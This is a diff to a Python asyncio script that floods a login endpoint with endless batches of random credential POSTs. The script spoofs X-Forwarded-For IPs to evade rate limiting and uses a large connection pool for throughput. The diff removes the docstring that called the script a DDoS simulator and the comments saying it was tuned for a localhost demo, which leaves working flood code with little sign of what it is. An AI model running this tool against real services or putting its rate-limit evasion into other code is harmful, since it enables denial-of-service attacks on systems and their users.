@@ -1,8 +1,3 @@
-"""
-Infinite Loop DDoS Attack Simulator
-(Targets the backend directly with randomized IP spoofing)
-"""
-
 import asyncio
 import aiohttp
 import time
@@ -10,13 +5,8 @@ import random
 import sys
 import os
 
-# --- Configuration ---
 TARGET_URL = os.getenv("TARGET_URL", "http://127.0.0.1:8000/api/login")
 
-# These defaults are tuned for a localhost application-layer demo.
-# They are strong enough to overwhelm the slow login path when protection is
-# off, but they avoid turning the test into a raw socket/OS saturation event
-# where in-app mitigation cannot visibly help.
 BATCH_SIZE = int(os.getenv("DDOS_BATCH_SIZE", "20"))
 WORKERS = int(os.getenv("DDOS_WORKERS", "8"))
 PAUSE_BETWEEN_BATCHES_SECONDS = float(os.getenv("DDOS_BATCH_PAUSE", "0.05"))
@@ -26,11 +16,9 @@ SEND_FORWARDED_FOR = os.getenv("DDOS_SEND_FORWARDED_FOR", "true").strip().lower(
 }
 
 def generate_spoofed_ip():
-    """Generates a fresh private IP so the rate limiter sees a new IP."""
     return f"10.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 250)}"
 
 async def send_batch(session: aiohttp.ClientSession, worker_id: int):
-    """Sends a batch of spam requests to the backend."""
     while True:
         tasks = []
         for _ in range(BATCH_SIZE):
@@ -38,7 +26,7 @@ async def send_batch(session: aiohttp.ClientSession, worker_id: int):
             headers = {"Content-Type": "application/json"}
             if SEND_FORWARDED_FOR:
                 headers["X-Forwarded-For"] = ip
-            # Add random garbage to the payload to bypass Exact-Match cache and AST caching if possible
+
             payload = {
                 "username": f"admin_flood_{random.randint(1, 999999)}",
                 "password": f"pwd_flood_{random.randint(1, 999999)}"
@@ -52,7 +40,6 @@ async def send_batch(session: aiohttp.ClientSession, worker_id: int):
             responses = await asyncio.gather(*tasks, return_exceptions=True)
             latency = time.time() - start
             
-            # Simple stats collection for this batch
             status_codes = {}
             for r in responses:
                 if isinstance(r, Exception):
@@ -77,10 +64,8 @@ async def main():
     print("=" * 60)
     print("Press Ctrl+C to stop the attack.\n")
     
-    # Wait a tiny bit just in case
     await asyncio.sleep(2)
     
-    # Configure connection pool for aggressive throughput
     connection_limit = max(50, WORKERS * BATCH_SIZE)
     conn = aiohttp.TCPConnector(limit=connection_limit, limit_per_host=connection_limit)
     timeout = aiohttp.ClientTimeout(total=REQUEST_TIMEOUT_SECONDS)
